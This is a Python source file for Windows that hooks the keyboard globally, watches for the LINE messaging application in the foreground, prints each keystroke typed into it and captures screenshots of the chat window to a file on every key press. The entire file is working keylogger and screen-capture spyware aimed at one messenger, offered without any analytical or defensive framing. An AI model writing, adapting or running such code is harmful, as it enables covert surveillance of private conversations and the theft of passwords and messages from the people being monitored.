# -*- coding: cp950 -*-

from ctypes import *
import pythoncom
import pyHook 
import win32clipboard
import time
import win32gui
import win32ui
import win32con
import cv2
import numpy as np

from PIL import Image

user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi

current_window = None
target_pid = None
process_id = None

windowTitle = None


def screenshot():

    global windowTitle
  
    # grab a handle to the target window - LINE
    hWnd = win32gui.FindWindow(None, windowTitle)
    
    # get the coordinates of the windows' upper-left and lower-right corners.
    left, top, right, bot = win32gui.GetWindowRect(hWnd)

    # determine the size of the monitors
    width = right - left + 94
    height = bot - top + 120

    # create a device context
    hWndDC = win32gui.GetWindowDC(hWnd)
    createDC  = win32ui.CreateDCFromHandle(hWndDC)

    # create a memory based device context
    memoryDC = createDC.CreateCompatibleDC()

    # create a bitmap object
    saveBmp = win32ui.CreateBitmap()
    saveBmp.CreateCompatibleBitmap(createDC, width, height)

    memoryDC.SelectObject(saveBmp)

    # copy the screen into our memory device context
    memoryDC.BitBlt((0, 0), (width, height), createDC, (-3, 3), win32con.SRCCOPY)

    # save the bitmap to a file
    saveBmp.SaveBitmapFile(memoryDC, 'C:\\Users\\user\\Desktop\\final\\final\\scn8.bmp')

    # convert the bitmap to np
    bmpbitArray = saveBmp.GetBitmapBits(True)
    img = np.fromstring(bmpbitArray, dtype = 'uint8')
    img.shape = (height, width, 4) 


    # free our objects
    memoryDC.DeleteDC()
    win32gui.DeleteObject(saveBmp.GetHandle())

    cv2.imshow("screenbox", img)

def get_current_process():
    
    global target_pid
    global process_id

    global windowTitle
    
    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)

    # now read it's title
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    # determine if the current window is "LINE"
    if executable.value.find('LINE.exe') != -1:
        target_pid = process_id
        windowTitle = window_title.value

        if window_title.value.find('LINE') != -1:
            target_pid = None
  
    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)


def KeyStroke(event):
    global target_pid
    global process_id
    global current_window 

    # check to see if target changed windows
    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()
        
    # if they pressed a standard key
    if process_id == target_pid:
        if event.Ascii > 32 and event.Ascii < 127:
            print chr(event.Ascii),
            
        screenshot()

    # pass execution to next hook registered 
    return True

# create and register a hook manager 
kl         = pyHook.HookManager()
kl.KeyDown = KeyStroke

# register the hook and execute forever
kl.HookKeyboard()
pythoncom.PumpMessages()
